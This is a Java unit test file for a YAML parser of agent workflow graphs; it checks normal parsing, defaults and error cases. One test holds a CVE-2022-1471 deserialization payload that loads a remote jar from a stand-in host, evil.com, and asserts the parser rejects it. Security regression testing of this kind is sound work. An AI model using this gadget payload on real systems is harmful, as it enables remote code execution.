package com.remisoft.agent.server.agent;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import com.remisoft.agent.domain.agent.AgentDag;

import java.net.URL;
import java.net.URLClassLoader;
import javax.script.ScriptEngineManager;
/**
 * {@link DagDslParser} 单元测试。
 *
 * <p>覆盖：
 * <ul>
 *   <li>正常解析（多节点 + 边 + 默认值）</li>
 *   <li>空内容 / 缺少 nodes 抛异常</li>
 *   <li>SafeConstructor 安全性（恶意 YAML 反序列化攻击不生效）</li>
 * </ul>
 *
 * @author remi-team
 * @since 1.0.0
 */
@DisplayName("YAML DSL 解析器 DagDslParser 测试")
class DagDslParserTest {

    private final DagDslParser parser = new DagDslParser();

    @Nested
    @DisplayName("正常解析")
    /**
     * 测试分组：正常解析
     */
    class ParseValid {

        @Test
        @DisplayName("多节点 + 边 + input-from + config")
        void shouldParseMultiNodeDag() {
            String yaml = """
                    name: project-analysis
                    nodes:
                      analyze:
                        agent-type: CHAT
                        prompt: "分析项目进度"
                      report:
                        agent-type: CHAT
                        prompt: "生成报告"
                        input-from: analyze
                        config:
                          temperature: 0.3
                    edges:
                      report:
                        - analyze
                    """;

            AgentDag dag = parser.parse(yaml);

            assertThat(dag.getName()).isEqualTo("project-analysis");
            assertThat(dag.getNodes()).hasSize(2);
            assertThat(dag.getNodes().get("analyze").getAgentType()).isEqualTo("CHAT");
            assertThat(dag.getNodes().get("analyze").getPrompt()).isEqualTo("分析项目进度");
            assertThat(dag.getNodes().get("report").getInputFrom()).isEqualTo("analyze");
            assertThat(dag.getNodes().get("report").getConfig()).containsEntry("temperature", 0.3);
            assertThat(dag.getEdges().get("report")).containsExactly("analyze");
        }

        @Test
        @DisplayName("默认值：agent-type 默认 CHAT，prompt 默认空字符串")
        void shouldApplyDefaults() {
            String yaml = """
                    name: simple
                    nodes:
                      step1: {}
                    """;

            AgentDag dag = parser.parse(yaml);

            assertThat(dag.getNodes().get("step1").getAgentType()).isEqualTo("CHAT");
            assertThat(dag.getNodes().get("step1").getPrompt()).isEqualTo("");
        }

        @Test
        @DisplayName("无 edges 时返回空 Map")
        void shouldParseWithoutEdges() {
            String yaml = """
                    name: no-edges
                    nodes:
                      a:
                        agent-type: CHAT
                    """;

            AgentDag dag = parser.parse(yaml);

            assertThat(dag.getNodes()).hasSize(1);
            assertThat(dag.getEdges()).isEmpty();
        }
    }

    @Nested
    @DisplayName("异常场景")
    /**
     * 测试分组：异常场景
     */
    class ParseInvalid {

        @Test
        @DisplayName("空内容抛 IllegalArgumentException")
        void shouldThrowOnEmptyContent() {
            assertThatThrownBy(() -> parser.parse(""))
                    .isInstanceOf(IllegalArgumentException.class)
                    .hasMessageContaining("为空");
        }

        @Test
        @DisplayName("缺少 nodes 定义抛 IllegalArgumentException")
        void shouldThrowOnMissingNodes() {
            String yaml = """
                    name: no-nodes
                    edges: {}
                    """;

            assertThatThrownBy(() -> parser.parse(yaml))
                    .isInstanceOf(IllegalArgumentException.class)
                    .hasMessageContaining("nodes");
        }

        @Test
        @DisplayName("nodes 为空 Map 抛 IllegalArgumentException")
        void shouldThrowOnEmptyNodes() {
            String yaml = """
                    name: empty-nodes
                    nodes: {}
                    """;

            assertThatThrownBy(() -> parser.parse(yaml))
                    .isInstanceOf(IllegalArgumentException.class)
                    .hasMessageContaining("nodes");
        }
    }

    @Nested
    @DisplayName("SafeConstructor 安全性（CVE-2022-1471）")
    /**
     * 测试分组：SafeConstructor 安全性（CVE-2022-1471）
     */
    class SafeConstructorSecurity {

        @Test
        @DisplayName("恶意 YAML（!!javax.script.ScriptEngineManager）不触发反序列化 RCE")
        void shouldRejectMaliciousYamlTag() {
            // CVE-2022-1471 经典 PoC：利用 !! 标签触发任意 Java 类构造
            String maliciousYaml = """
                    name: attack
                    nodes:
                      evil: !!ScriptEngineManager [!!URLClassLoader [[!!URL ["http://evil.com/payload.jar"]]]]
                    """;

            // SafeConstructor 会抛出异常或忽略恶意标签，而非执行任意代码
            assertThatThrownBy(() -> parser.parse(maliciousYaml))
                    .isInstanceOf(Exception.class);
        }
    }
}
